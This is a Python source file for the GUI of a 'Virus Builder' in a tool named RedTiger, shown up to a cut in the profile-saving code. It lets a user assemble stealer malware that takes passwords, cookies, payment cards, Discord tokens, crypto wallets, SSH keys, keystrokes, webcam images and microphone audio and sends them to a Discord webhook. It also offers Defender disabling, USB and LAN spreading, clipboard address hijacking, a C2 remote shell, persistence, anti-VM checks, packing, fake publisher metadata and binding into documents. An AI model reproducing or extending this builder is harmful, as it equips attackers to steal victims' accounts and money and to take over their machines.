# Copyright (c) RedTiger
# See the file 'LICENSE' for copying permission

from Config.Util import *
from Config.Config import *
import os, json, shutil, random, string, ast, base64
import tkinter
from tkinter import filedialog, messagebox

try:
    import customtkinter as ctk
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.backends import default_backend
except Exception:
    try:
        import subprocess as _subp
        for _p in ["customtkinter", "cryptography"]:
            try:
                _subp.run([sys.executable, "-m", "pip", "install", "--quiet",
                           "--disable-pip-version-check", _p],
                          stdout=_subp.DEVNULL, stderr=_subp.DEVNULL, timeout=120)
            except: pass
    except: pass
    import customtkinter as ctk
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.backends import default_backend

Title("Virus Builder")

try:
    try:
        import ctypes as _si_ct
        _si_mutex = _si_ct.windll.kernel32.CreateMutexW(None, False, "Ultria.VirusBuilder.v1")
        if _si_ct.windll.kernel32.GetLastError() == 183:
            print(f"\n  {red}[!]{white}  Virus Builder is already open.\n")
            input("  Press Enter to exit... ")
            sys.exit(0)
    except Exception:
        pass

    _PRESET_MODE     = "--preset" in sys.argv
    _preset_1py_root = os.path.dirname(os.path.abspath(__file__))
    exit_window = False

    colors = {
        "white"     : "#ffffff",
        "red"       : "#a80505",
        "dark_red"  : "#800000",
        "dark_gray" : "#1e1e1e",
        "gray"      : "#444444",
        "light_gray": "#949494",
        "background": "#262626",
        "tab_bg"    : "#2e2e2e",
    }

    def ClosingWindow():
        global exit_window
        exit_window = True
        for aid in builder.tk.eval('after info').split():
            try: builder.after_cancel(aid)
            except: pass
        try: builder.quit()
        except: pass
        try: builder.destroy()
        except: pass

    def ClosingBuild():
        global exit_window
        exit_window = False  # distinguish from user closing (ClosingWindow sets True)
        for aid in builder.tk.eval('after info').split():
            try: builder.after_cancel(aid)
            except: pass
        try: builder.quit()
        except: pass
        try: builder.destroy()
        except: pass

    builder = ctk.CTk()
    builder.title(f"{name_tool} {version_tool} - Virus Builder")
    builder.geometry("980x800")
    builder.resizable(False, False)
    builder.configure(fg_color=colors["background"])
    if _PRESET_MODE: builder.withdraw()
    try: builder.iconbitmap(os.path.join(tool_path, "Img", "RedTiger_icon.ico"))
    except Exception: pass

    # Stealer (existing)
    option_system = option_game_launchers = option_wallets = option_apps = "Disable"
    option_discord = option_discord_injection = option_passwords = option_cookies = "Disable"
    option_history = option_downloads = option_cards = option_extentions = "Disable"
    option_interesting_files = option_roblox = option_webcam = option_screenshot = "Disable"
    # Stealer (new)
    option_wifi_passwords = option_clipboard = option_ssh_keys = option_filezilla = "Disable"
    option_env_variables  = option_minecraft = option_keylogger = "Disable"
    option_crypto_wallets = option_microphone = "Disable"
    option_firefox = option_steam = "Disable"
    # Malware (existing)
    option_block_key = option_block_mouse = option_block_task_manager = option_block_website = "Disable"
    option_shutdown  = option_spam_open_programs = option_spam_create_files = "Disable"
    option_fake_error = option_startup = option_restart = option_anti_vm_and_debug = "Disable"
    # Malware (new)
    option_clipboard_hijacker = option_melt = option_disable_defender = "Disable"
    option_usb_spreader = option_scheduled_task = option_c2_heartbeat = "Disable"
    c2_registry_msgid = ""
    option_process_disguise = option_polymorphic_repack = option_lan_spreader = "Disable"
    # Evasion
    option_timing_evasion = option_string_encryption = option_upx_compress = option_fake_metadata = "Disable"

    webhook = name_file = icon_path = "None"
    _build_upx_path = _build_fake_name = _build_fake_company = _build_fake_ver = ""
    binder_path = ""
    file_type = "None"
    fake_error_title   = ""
    fake_error_message = ""
    fake_error_window_status = True

    def _sv(v="Disable"): return ctk.StringVar(value=v)

    sv_system                = _sv(); sv_game_launchers       = _sv(); sv_wallets               = _sv()
    sv_apps                  = _sv(); sv_roblox               = _sv(); sv_discord               = _sv()
    sv_discord_injection     = _sv(); sv_passwords            = _sv(); sv_cookies               = _sv()
    sv_history               = _sv(); sv_downloads            = _sv(); sv_cards                 = _sv()
    sv_extentions            = _sv(); sv_interesting_files    = _sv(); sv_webcam                = _sv()
    sv_screenshot            = _sv()
    sv_wifi_passwords        = _sv(); sv_clipboard            = _sv(); sv_ssh_keys              = _sv()
    sv_filezilla             = _sv(); sv_env_variables        = _sv(); sv_minecraft             = _sv()
    sv_keylogger             = _sv(); sv_crypto_wallets       = _sv(); sv_microphone            = _sv()
    sv_firefox               = _sv(); sv_steam                = _sv()
    sv_binder_label          = ctk.StringVar(value="No file selected")
    sv_block_key             = _sv(); sv_block_mouse          = _sv(); sv_block_task_manager    = _sv()
    sv_block_website         = _sv(); sv_shutdown             = _sv(); sv_spam_open_programs    = _sv()
    sv_spam_create_files     = _sv(); sv_fake_error           = _sv(); sv_startup               = _sv()
    sv_restart               = _sv(); sv_anti_vm_and_debug    = _sv()
    sv_clipboard_hijacker    = _sv(); sv_melt                 = _sv(); sv_disable_defender      = _sv()
    sv_usb_spreader          = _sv(); sv_scheduled_task       = _sv(); sv_c2_heartbeat         = _sv()
    sv_process_disguise      = _sv(); sv_polymorphic_repack   = _sv(); sv_lan_spreader         = _sv()
    sv_timing_evasion        = _sv(); sv_string_encryption    = _sv(); sv_upx_compress          = _sv()
    sv_fake_metadata         = _sv()
    sv_file_type             = _sv("File Type")
    sv_webhook               = _sv("None")
    sv_upx_path              = _sv("")
    sv_fake_name             = _sv("")
    sv_fake_company          = _sv("")
    sv_fake_version          = _sv("")

    def ErrorLogs(msg):
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {msg + white}")
        messagebox.showerror(f"{name_tool} {version_tool} - Virus Builder", msg)

    def InfoLogs(msg):
        messagebox.showinfo(f"{name_tool} {version_tool} - Virus Builder", msg)

    def TestWebhook():
        if CheckWebhook(webhook_url.get()):
            InfoLogs("The webhook is valid.")
        else:
            ErrorLogs("The webhook is invalid.")

    def ChooseIcon():
        global icon_path
        try:
            icon_path = filedialog.askopenfilename(parent=builder, title=f"{name_tool} {version_tool} - Choose icon (.ico)", filetypes=[("ICO files", "*.ico")])
            if icon_path: icon_btn.configure(text=f"Icon: {os.path.basename(icon_path)[:20]}")
        except: pass

    def CreateFakeErrorWindow():
        global fake_error_window_status
        if fake_error_window_status:
            fake_error_window_status = False
        else:
            fake_error_window_status = True
            return
        w = ctk.CTkToplevel(builder)
        w.title(f"{name_tool} {version_tool} - Fake Error")
        w.geometry("320x260"); w.resizable(False, False)
        w.configure(fg_color=colors["background"])
        w.grab_set()
        w.lift()
        w.focus_force()
        t_ent = ctk.CTkEntry(w, justify="center", placeholder_text="Error Title",   fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(family="Helvetica", size=13), height=40, width=280)
        m_ent = ctk.CTkEntry(w, justify="center", placeholder_text="Error Message", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(family="Helvetica", size=13), height=40, width=280)
        t_ent.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="ew")
        m_ent.grid(row=1, column=0, padx=20, pady=(10, 10), sticky="ew")
        def _val():
            global fake_error_title, fake_error_message
            fake_error_title   = t_ent.get() or fake_error_title
            fake_error_message = m_ent.get() or fake_error_message
            w.destroy()
        ctk.CTkButton(w, text="Validate", command=_val, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=14), height=40).grid(row=2, column=0, padx=20, pady=10, sticky="ew")
        w.protocol("WM_DELETE_WINDOW", lambda: (setattr(w, '_closed', True), w.destroy()))
        builder.wait_window(w)

    Slow(virus_banner())

    builder.grid_columnconfigure(0, weight=0)
    builder.grid_columnconfigure(1, weight=1)
    builder.grid_rowconfigure(0, weight=1)

    sidebar = ctk.CTkFrame(builder, width=220, fg_color=colors["dark_gray"], corner_radius=0)
    sidebar.grid(row=0, column=0, sticky="nsew")
    sidebar.grid_propagate(False)
    sidebar.grid_rowconfigure(8, weight=1)  # spacer row

    # Logo / title block
    ctk.CTkLabel(sidebar, text=name_tool, font=ctk.CTkFont(family="Helvetica", size=20, weight="bold"),
                 text_color=colors["red"]).grid(row=0, column=0, padx=18, pady=(22, 0), sticky="w")
    ctk.CTkLabel(sidebar, text=version_tool, font=ctk.CTkFont(family="Helvetica", size=11),
                 text_color=colors["light_gray"]).grid(row=1, column=0, padx=18, pady=(0, 2), sticky="w")
    ctk.CTkLabel(sidebar, text="Virus Builder", font=ctk.CTkFont(family="Helvetica", size=13),
                 text_color=colors["white"]).grid(row=2, column=0, padx=18, pady=(0, 16), sticky="w")

    ctk.CTkFrame(sidebar, height=1, fg_color="#333333").grid(row=3, column=0, sticky="ew", padx=12, pady=(0, 14))

    # Stats label
    sv_stats = ctk.StringVar(value="0 stealer  •  0 malware  •  0 evasion")
    ctk.CTkLabel(sidebar, textvariable=sv_stats,
                 font=ctk.CTkFont(family="Helvetica", size=10),
                 text_color=colors["light_gray"],
                 wraplength=190, justify="left").grid(row=4, column=0, padx=18, pady=(0, 14), sticky="w")

    # Nav buttons
    _NAV_BTN = dict(width=190, height=40, corner_radius=6, anchor="w",
                    font=ctk.CTkFont(family="Helvetica", size=13))
    _nav_active   = dict(fg_color=colors["red"],      hover_color=colors["dark_red"],  text_color=colors["white"])
    _nav_inactive = dict(fg_color="#2a2a2a",           hover_color="#333333",           text_color=colors["white"])

    nav_btns = {}
    _section_frames = {}
    _current_section = [None]

    def _show_section(name):
        if _current_section[0] == name:
            return
        _current_section[0] = name
        for k, f in _section_frames.items():
            f.grid_remove()
        _section_frames[name].grid(row=0, column=0, sticky="nsew")
        for k, b in nav_btns.items():
            b.configure(**(dict(_nav_active) if k == name else dict(_nav_inactive)))

    for _row, (_sid, _label) in enumerate([
        ("STEALER",  "  Stealer"),
        ("MALWARE",  "  Malware"),
        ("EVASION",  "  Evasion"),
        ("CONFIG",   "  Config"),
    ], start=5):
        _btn = ctk.CTkButton(sidebar, text=_label, command=lambda s=_sid: _show_section(s),
                             **_NAV_BTN, **_nav_inactive)
        _btn.grid(row=_row, column=0, padx=15, pady=3, sticky="w")
        nav_btns[_sid] = _btn

    # Spacer
    ctk.CTkFrame(sidebar, fg_color="transparent").grid(row=8, column=0, sticky="nsew")

    ctk.CTkFrame(sidebar, height=1, fg_color="#333333").grid(row=9, column=0, sticky="ew", padx=12, pady=(0, 10))

    # Build button placeholder (real button added after BuildSettings is defined)
    _build_btn_ph = ctk.CTkFrame(sidebar, fg_color="transparent", height=50)
    _build_btn_ph.grid(row=10, column=0, padx=15, pady=(0, 20), sticky="ew")

    main_panel = ctk.CTkFrame(builder, fg_color=colors["background"], corner_radius=0)
    main_panel.grid(row=0, column=1, sticky="nsew")
    main_panel.grid_rowconfigure(0, weight=1)
    main_panel.grid_columnconfigure(0, weight=1)

    _C_ON_BG  = "#3d0000"
    _C_ON_BD  = colors["red"]
    _C_OFF_BG = colors["dark_gray"]
    _C_OFF_BD = "#2a2a2a"

    def _refresh_card(frame, sv, lbl_w, ind_w):
        on = sv.get() == "Enable"
        frame.configure(fg_color=_C_ON_BG if on else _C_OFF_BG,
                        border_color=_C_ON_BD if on else _C_OFF_BD)
        ind_w.configure(text="●", text_color=colors["red"] if on else "#555555")

    def _make_card(parent, label, desc, sv, row, col, extra_cmd=None, _store=None):
        frame = ctk.CTkFrame(parent, fg_color=_C_OFF_BG, border_color=_C_OFF_BD,
                             border_width=1, corner_radius=8, cursor="hand2")
        frame.grid(row=row, column=col, padx=6, pady=5, sticky="nsew")
        frame.grid_columnconfigure(0, weight=1)

        top = ctk.CTkFrame(frame, fg_color="transparent")
        top.grid(row=0, column=0, padx=10, pady=(8, 2), sticky="ew")
        top.grid_columnconfigure(0, weight=1)

        ind = ctk.CTkLabel(top, text="●", font=ctk.CTkFont(size=10),
                           text_color="#555555", width=14)
        ind.grid(row=0, column=1, sticky="e")

        lbl = ctk.CTkLabel(top, text=label, font=ctk.CTkFont(family="Helvetica", size=13, weight="bold"),
                           text_color=colors["white"], anchor="w")
        lbl.grid(row=0, column=0, sticky="w")

        ctk.CTkLabel(frame, text=desc, font=ctk.CTkFont(family="Helvetica", size=10),
                     text_color=colors["light_gray"], anchor="w", wraplength=165,
                     justify="left").grid(row=1, column=0, padx=10, pady=(0, 8), sticky="w")

        def _toggle(e=None):
            sv.set("Disable" if sv.get() == "Enable" else "Enable")
            _refresh_card(frame, sv, lbl, ind)
            _update_stats()
            if extra_cmd and sv.get() == "Enable":
                extra_cmd()

        for w in (frame, lbl, ind):
            w.bind("<Button-1>", _toggle)

        _refresh_card(frame, sv, lbl, ind)
        if _store is not None:
            _store.append((frame, sv, lbl, ind))
        return frame

    _stealer_svs = [sv_system, sv_game_launchers, sv_wallets, sv_apps, sv_roblox, sv_discord,
                    sv_discord_injection, sv_passwords, sv_cookies, sv_history, sv_downloads,
                    sv_cards, sv_extentions, sv_interesting_files, sv_webcam, sv_screenshot,
                    sv_wifi_passwords, sv_clipboard, sv_ssh_keys, sv_filezilla,
                    sv_env_variables, sv_minecraft, sv_keylogger, sv_crypto_wallets,
                    sv_microphone, sv_firefox, sv_steam]
    _malware_svs = [sv_block_key, sv_block_mouse, sv_block_task_manager, sv_block_website,
                    sv_shutdown, sv_spam_open_programs, sv_spam_create_files, sv_fake_error,
                    sv_startup, sv_restart, sv_anti_vm_and_debug,
                    sv_clipboard_hijacker, sv_melt, sv_disable_defender,
                    sv_usb_spreader, sv_scheduled_task, sv_c2_heartbeat,
                    sv_process_disguise, sv_polymorphic_repack, sv_lan_spreader]
    _evasion_svs = [sv_timing_evasion, sv_string_encryption, sv_upx_compress, sv_fake_metadata]

    def _update_stats():
        ns = sum(1 for s in _stealer_svs  if s.get() == "Enable")
        nm = sum(1 for s in _malware_svs  if s.get() == "Enable")
        ne = sum(1 for s in _evasion_svs  if s.get() == "Enable")
        sv_stats.set(f"{ns} stealer  •  {nm} malware  •  {ne} evasion")

    def _make_section(name, title, subtitle):
        sec = ctk.CTkFrame(main_panel, fg_color=colors["background"])
        sec.grid(row=0, column=0, sticky="nsew")
        sec.grid_rowconfigure(1, weight=1)
        sec.grid_columnconfigure(0, weight=1)
        # Header bar
        hdr = ctk.CTkFrame(sec, fg_color=colors["dark_gray"], height=56, corner_radius=0)
        hdr.grid(row=0, column=0, sticky="ew"); hdr.grid_propagate(False)
        hdr.grid_columnconfigure(0, weight=1)
        ctk.CTkLabel(hdr, text=title, font=ctk.CTkFont(family="Helvetica", size=22, weight="bold"),
                     text_color=colors["red"]).grid(row=0, column=0, padx=20, pady=(8, 0), sticky="w")
        ctk.CTkLabel(hdr, text=subtitle, font=ctk.CTkFont(family="Helvetica", size=11),
                     text_color=colors["light_gray"]).grid(row=1, column=0, padx=20, pady=(0, 6), sticky="w")
        _section_frames[name] = sec
        return sec

    sec_st = _make_section("STEALER", "Stealer Modules",
                           "Click a card to toggle  •  all data is sent to your webhook")
    # Select/Deselect row
    def _sel_all_s():
        for s in _stealer_svs: s.set("Enable")
        for c in _st_cards: _refresh_card(*c)
        _update_stats()
    def _desel_all_s():
        for s in _stealer_svs: s.set("Disable")
        for c in _st_cards: _refresh_card(*c)
        _update_stats()

    sb_bar = ctk.CTkFrame(sec_st, fg_color="transparent")
    sb_bar.grid(row=0, column=0, sticky="e", padx=16, pady=6)
    # place it overlaid on header
    sb_bar.lift()
    ctk.CTkButton(sb_bar, text="All", width=52, height=26,
                  fg_color=colors["red"], hover_color=colors["dark_red"],
                  font=ctk.CTkFont(size=11), command=_sel_all_s).pack(side="left", padx=(0, 4))
    ctk.CTkButton(sb_bar, text="None", width=52, height=26,
                  fg_color="#2a2a2a", hover_color="#333333",
                  font=ctk.CTkFont(size=11), command=_desel_all_s).pack(side="left")

    scroll_st = ctk.CTkScrollableFrame(sec_st, fg_color=colors["background"],
                                       scrollbar_button_color=colors["red"],
                                       scrollbar_button_hover_color=colors["dark_red"])
    scroll_st.grid(row=1, column=0, sticky="nsew", padx=10, pady=6)
    for c in range(3): scroll_st.grid_columnconfigure(c, weight=1)

    _st_cards = []  # (frame, sv, lbl_w, ind_w) — populated by _make_card
    _ST_MODULES = [
        (sv_system,           "System Info",          "OS, hardware, IP, user info"),
        (sv_wallets,          "Wallets Session",       "Hot-wallet credential files"),
        (sv_game_launchers,   "Game Launchers",        "Steam, Epic, Origin sessions"),
        (sv_apps,             "Telegram Session",      "Telegram tdata folder"),
        (sv_roblox,           "Roblox Accounts",       "Roblox cookies & tokens"),
        (sv_discord,          "Discord Accounts",      "Discord token harvester"),
        (sv_discord_injection,"Discord Injection",     "Persistent token grabber"),
        (sv_passwords,        "Passwords",             "Browser saved passwords"),
        (sv_cookies,          "Cookies",               "Browser session cookies"),
        (sv_history,          "Browsing History",      "Chrome, Edge, Firefox history"),
        (sv_downloads,        "Download History",      "Recent browser downloads"),
        (sv_cards,            "Cards",                 "Saved payment card data"),
        (sv_extentions,       "Extensions",            "Browser extension data"),
        (sv_interesting_files,"Interesting Files",     "Docs, keys, config files"),
        (sv_webcam,           "Webcam Snapshot",       "Capture webcam image"),
        (sv_screenshot,       "Screenshot",            "Capture all monitors"),
        (sv_wifi_passwords,   "WiFi Passwords",        "Saved wireless credentials"),
        (sv_clipboard,        "Clipboard",             "Current clipboard content"),
        (sv_ssh_keys,         "SSH Keys",              ".ssh directory contents"),
        (sv_filezilla,        "FileZilla Creds",       "Saved FTP credentials"),
        (sv_env_variables,    "Env Variables",         "System & .env file vars"),
        (sv_minecraft,        "Minecraft Session",     "Minecraft account tokens"),
        (sv_keylogger,        "Keylogger",             "Background keystroke log"),
        (sv_crypto_wallets,   "Crypto Wallets",        "Desktop wallet app data"),
        (sv_microphone,       "Microphone Record",     "Short audio recording"),
        (sv_firefox,          "Firefox Data",          "Firefox profiles & logins"),
        (sv_steam,            "Steam Session",         "Steam session files"),
    ]
    for i, (sv, label, desc) in enumerate(_ST_MODULES):
        _make_card(scroll_st, label, desc, sv, row=i // 3, col=i % 3, _store=_st_cards)

    sec_ml = _make_section("MALWARE", "Malware Modules",
                           "Destructive & persistence payloads — use responsibly")
    _ml_cards = []
    def _sel_all_m():
        for s in _malware_svs: s.set("Enable")
        for c in _ml_cards: _refresh_card(*c)
        _update_stats()
    def _desel_all_m():
        for s in _malware_svs: s.set("Disable")
        for c in _ml_cards: _refresh_card(*c)
        _update_stats()

    mb_bar = ctk.CTkFrame(sec_ml, fg_color="transparent")
    mb_bar.grid(row=0, column=0, sticky="e", padx=16, pady=6)
    mb_bar.lift()
    ctk.CTkButton(mb_bar, text="All", width=52, height=26,
                  fg_color=colors["red"], hover_color=colors["dark_red"],
                  font=ctk.CTkFont(size=11), command=_sel_all_m).pack(side="left", padx=(0, 4))
    ctk.CTkButton(mb_bar, text="None", width=52, height=26,
                  fg_color="#2a2a2a", hover_color="#333333",
                  font=ctk.CTkFont(size=11), command=_desel_all_m).pack(side="left")

    scroll_ml = ctk.CTkScrollableFrame(sec_ml, fg_color=colors["background"],
                                       scrollbar_button_color=colors["red"],
                                       scrollbar_button_hover_color=colors["dark_red"])
    scroll_ml.grid(row=1, column=0, sticky="nsew", padx=10, pady=6)
    for c in range(3): scroll_ml.grid_columnconfigure(c, weight=1)

    _ML_MODULES = [
        (sv_block_key,          "Block Keyboard",        "Disable keyboard input",            None),
        (sv_block_mouse,        "Block Mouse",           "Disable mouse input",               None),
        (sv_block_task_manager, "Block Task Manager",    "Prevent process killing",           None),
        (sv_block_website,      "Block AV Sites",        "Block AV vendor websites",          None),
        (sv_clipboard_hijacker, "Clipboard Hijacker",    "Replace crypto addresses",          None),
        (sv_spam_open_programs, "Spam Programs",         "Open many windows rapidly",         None),
        (sv_spam_create_files,  "Spam Files",            "Flood disk with junk files",        None),
        (sv_shutdown,           "Shutdown",              "Force shutdown target PC",          None),
        (sv_fake_error,         "Fake Error",            "Show deceptive error dialog",       None),
        (sv_melt,               "Melt (Self-Delete)",    "Wipe exe after execution",          None),
        (sv_anti_vm_and_debug,  "Anti VM & Debug",       "Exit in sandboxed environments",    None),
        (sv_startup,            "Launch at Startup",     "Persist via registry Run key",      None),
        (sv_restart,            "Restart Every 5m",      "Re-run payload periodically",       None),
        (sv_disable_defender,   "Disable Defender",      "Attempt to kill Windows AV",        None),
        (sv_usb_spreader,       "USB Spreader",          "Copy to attached USB drives",       None),
        (sv_scheduled_task,     "Scheduled Task",        "Persist via Task Scheduler",        None),
        (sv_c2_heartbeat,       "C2 Heartbeat",          "Live shell + remote commands",      None),
        (sv_process_disguise,   "Process Disguise",      "Mimic a system process name",       None),
        (sv_polymorphic_repack, "Polymorphic Repack",    "Repack exe every 24h",              None),
        (sv_lan_spreader,       "LAN Spreader",          "Spread across local network",       None),
    ]
    for i, (sv, label, desc, ecmd) in enumerate(_ML_MODULES):
        _make_card(scroll_ml, label, desc, sv, row=i // 3, col=i % 3, extra_cmd=ecmd, _store=_ml_cards)

    sec_ev = _make_section("EVASION", "Evasion Modules",
                           "Obfuscation & anti-detection features applied at build time")
    scroll_ev = ctk.CTkScrollableFrame(sec_ev, fg_color=colors["background"],
                                       scrollbar_button_color=colors["red"],
                                       scrollbar_button_hover_color=colors["dark_red"])
    scroll_ev.grid(row=1, column=0, sticky="nsew", padx=10, pady=6)
    for c in range(3): scroll_ev.grid_columnconfigure(c, weight=1)

    _EV_MODULES = [
        (sv_timing_evasion,   "Timing Evasion",       "Sleep 30s before payload runs"),
        (sv_string_encryption,"String Encryption",    "XOR-obfuscate embedded strings"),
        (sv_upx_compress,     "UPX Compression",      "Pack exe with UPX to shrink size"),
        (sv_fake_metadata,    "Fake Metadata",        "Spoof exe product/company info"),
    ]
    for i, (sv, label, desc) in enumerate(_EV_MODULES):
        _make_card(scroll_ev, label, desc, sv, row=i // 3, col=i % 3)

    sec_cfg = _make_section("CONFIG", "Build Configuration",
                            "Webhook, output options, profile save/load")
    cfg_outer = ctk.CTkFrame(sec_cfg, fg_color=colors["background"])
    cfg_outer.grid(row=1, column=0, sticky="nsew")
    cfg_outer.grid_rowconfigure(0, weight=1)
    cfg_outer.grid_columnconfigure(0, weight=1)

    cfg = ctk.CTkScrollableFrame(cfg_outer, fg_color=colors["background"],
                                 scrollbar_button_color=colors["red"],
                                 scrollbar_button_hover_color=colors["dark_red"])
    cfg.grid(row=0, column=0, sticky="nsew", padx=0, pady=0)
    cfg.grid_columnconfigure(0, weight=1); cfg.grid_columnconfigure(1, weight=1)

    LBL = dict(font=ctk.CTkFont(family="Helvetica", size=13), text_color=colors["red"], anchor="w")
    ENT = dict(height=42, corner_radius=5, border_color=colors["red"], fg_color=colors["dark_gray"],
               text_color=colors["white"], border_width=2,
               font=ctk.CTkFont(family="Helvetica", size=14), justify="center")

    ctk.CTkLabel(cfg, text="Discord Webhook URL", **LBL).grid(row=0, column=0, columnspan=2, padx=20, pady=(20, 2), sticky="w")
    webhook_url = ctk.CTkEntry(cfg, placeholder_text="https://discord.com/api/webhooks/...", width=500, **ENT)
    webhook_url.grid(row=1, column=0, padx=20, pady=(0, 4), sticky="w")
    ctk.CTkButton(cfg, text="Test Webhook", command=TestWebhook, width=160, height=42,
                  fg_color=colors["red"], hover_color=colors["dark_red"],
                  font=ctk.CTkFont(family="Helvetica", size=13)).grid(row=1, column=1, padx=(4, 20), pady=(0, 4), sticky="w")

    ctk.CTkLabel(cfg, text="Output File Name", **LBL).grid(row=2, column=0, padx=20, pady=(12, 2), sticky="w")
    name_file_entry = ctk.CTkEntry(cfg, placeholder_text="e.g. setup, update, loader", width=300, **ENT)
    name_file_entry.grid(row=3, column=0, padx=20, pady=(0, 4), sticky="w")

    ctk.CTkLabel(cfg, text="Output Format", **LBL).grid(row=4, column=0, padx=20, pady=(12, 2), sticky="w")
    file_type_menu = ctk.CTkOptionMenu(cfg, height=42, width=200,
                                       font=ctk.CTkFont(family="Helvetica", size=13),
                                       variable=sv_file_type,
                                       values=["Python File", "Exe File"],
                                       fg_color=colors["dark_gray"],
                                       button_color=colors["red"],
                                       button_hover_color=colors["dark_red"],
                                       text_color=colors["white"])
    file_type_menu.grid(row=5, column=0, padx=20, pady=(0, 4), sticky="w")

    ctk.CTkLabel(cfg, text="Custom Icon (.ico)  —  Exe only", **LBL).grid(row=6, column=0, padx=20, pady=(12, 2), sticky="w")
    icon_btn = ctk.CTkButton(cfg, text="Select Icon", command=ChooseIcon, width=200, height=42,
                             fg_color=colors["red"], hover_color=colors["dark_red"],
                             font=ctk.CTkFont(family="Helvetica", size=13))
    icon_btn.grid(row=7, column=0, padx=20, pady=(0, 4), sticky="w")

    ctk.CTkLabel(cfg, text="Fake Metadata  —  Exe only (leave blank to skip)", **LBL).grid(row=8, column=0, columnspan=2, padx=20, pady=(14, 2), sticky="w")
    fake_name_entry    = ctk.CTkEntry(cfg, placeholder_text="Product name  (e.g. Adobe Updater)", width=280, **ENT)
    fake_company_entry = ctk.CTkEntry(cfg, placeholder_text="Company  (e.g. Adobe Inc.)",         width=280, **ENT)
    fake_ver_entry     = ctk.CTkEntry(cfg, placeholder_text="Version  (e.g. 1.0.0.0)",            width=200, **ENT)
    fake_name_entry.grid(   row=9,  column=0, padx=20, pady=(0, 4), sticky="w")
    fake_company_entry.grid(row=10, column=0, padx=20, pady=(0, 4), sticky="w")
    fake_ver_entry.grid(    row=11, column=0, padx=20, pady=(0, 4), sticky="w")

    ctk.CTkLabel(cfg, text="UPX path  —  leave blank to auto-detect", **LBL).grid(row=12, column=0, padx=20, pady=(14, 2), sticky="w")
    upx_path_entry = ctk.CTkEntry(cfg, placeholder_text="C:\\upx\\upx.exe  (or just upx if in PATH)", width=380, **ENT)
    upx_path_entry.grid(row=13, column=0, columnspan=2, padx=20, pady=(0, 8), sticky="w")
    _upx_bundled = os.path.join(tool_path, "UPX", "upx.exe")
    if os.path.isfile(_upx_bundled):
        upx_path_entry.insert(0, _upx_bundled)

    def ChooseUpx():
        try:
            p = filedialog.askopenfilename(parent=builder, title="Select upx.exe", filetypes=[("EXE","*.exe"),("All","*")])
            if p: upx_path_entry.delete(0,"end"); upx_path_entry.insert(0, p)
        except: pass
    ctk.CTkButton(cfg, text="Browse UPX", command=ChooseUpx, width=130, height=38,
                  fg_color=colors["dark_gray"], hover_color="#333333",
                  font=ctk.CTkFont(size=12)).grid(row=13, column=1, padx=(4, 20), pady=(0, 8), sticky="w")

    ctk.CTkLabel(cfg, text="C2 Registry MSG ID  —  required if C2 Heartbeat enabled", **LBL).grid(row=14, column=0, columnspan=2, padx=20, pady=(14, 2), sticky="w")
    registry_msgid_entry = ctk.CTkEntry(cfg, placeholder_text="Paste the registry message ID from [S] Setup Registry in the controller", width=620, **ENT)
    registry_msgid_entry.grid(row=15, column=0, columnspan=2, padx=20, pady=(0, 4), sticky="w")

    ctk.CTkLabel(cfg, text="Bind with existing file  —  Exe only (leave empty to skip)", **LBL
                 ).grid(row=16, column=0, columnspan=2, padx=20, pady=(14, 2), sticky="w")
    binder_frame = ctk.CTkFrame(cfg, fg_color="transparent")
    binder_frame.grid(row=17, column=0, columnspan=2, padx=20, pady=(0, 4), sticky="w")

    def ChooseBinder():
        global binder_path
        try:
            p = filedialog.askopenfilename(
                parent=builder,
                title=f"{name_tool} {version_tool} - Select file to bind",
                filetypes=[
                    ("All files",        "*.*"),
                    ("Executables",      "*.exe"),
                    ("PDF Documents",    "*.pdf"),
                    ("Office Documents", "*.docx *.xlsx *.pptx"),
                    ("Images",           "*.jpg *.jpeg *.png *.gif *.bmp"),
                    ("Videos",           "*.mp4 *.avi *.mkv"),
                ])
            if p:
                binder_path = p
                short = os.path.basename(p)
                sv_binder_label.set(short[:40] + ("…" if len(short) > 40 else ""))
        except: pass

    def ClearBinder():
        global binder_path
        binder_path = ""
        sv_binder_label.set("No file selected")

    binder_btn = ctk.CTkButton(binder_frame, text="Select File", command=ChooseBinder,
                               width=130, height=38, state="disabled",
                               fg_color=colors["red"], hover_color=colors["dark_red"],
                               font=ctk.CTkFont(size=12))
    binder_btn.pack(side="left", padx=(0, 6))
    ctk.CTkButton(binder_frame, text="Clear", command=ClearBinder,
                  width=70, height=38,
                  fg_color=colors["dark_gray"], hover_color="#333333",
                  font=ctk.CTkFont(size=12)).pack(side="left", padx=(0, 10))
    ctk.CTkLabel(binder_frame, textvariable=sv_binder_label,
                 font=ctk.CTkFont(family="Helvetica", size=12),
                 text_color=colors["light_gray"]).pack(side="left")

    # Config profile save/load
    ctk.CTkLabel(cfg, text="Config Profile", **LBL).grid(row=18, column=0, padx=20, pady=(14, 2), sticky="w")
    prof_frame = ctk.CTkFrame(cfg, fg_color="transparent")
    prof_frame.grid(row=19, column=0, columnspan=2, padx=20, pady=(0, 20), sticky="w")

    def SaveProfile():
        try:
            fp = filedialog.asksaveasfilename(parent=builder, defaultextension=".json",
                                              filetypes=[("JSON","*.json")], title="Save profile")
            if not fp: return
            data = {}
            for k, sv in [("webhook", webhook_url), ("name_file", name_file_entry),
                          ("fake_name", fake_name_entry), ("fake_company", fake_company_entry),
                          ("fake_version", fake_ver_entry), ("upx_path", upx_path_entry)]:
                data[k] = sv.get()
            for name, sv in [
                ("file_type", sv_file_type), ("system", sv_system), ("wallets", sv_wallets),
                ("game_launchers", sv_game_launchers), ("apps", sv_apps), ("roblox", sv_roblox),
                ("discord", sv_discord), ("discord_injection", sv_discord_injection),
                ("passwords", sv_passwords), ("cookies", sv_cookies), ("history", sv_history),
                ("downloads", sv_downloads), ("cards", sv_cards), ("extentions", sv_extentions),
                ("interesting_files", sv_interesting_files), ("webcam", sv_webcam),
                ("screenshot", sv_screenshot), ("wifi_passwords", sv_wifi_passwords),
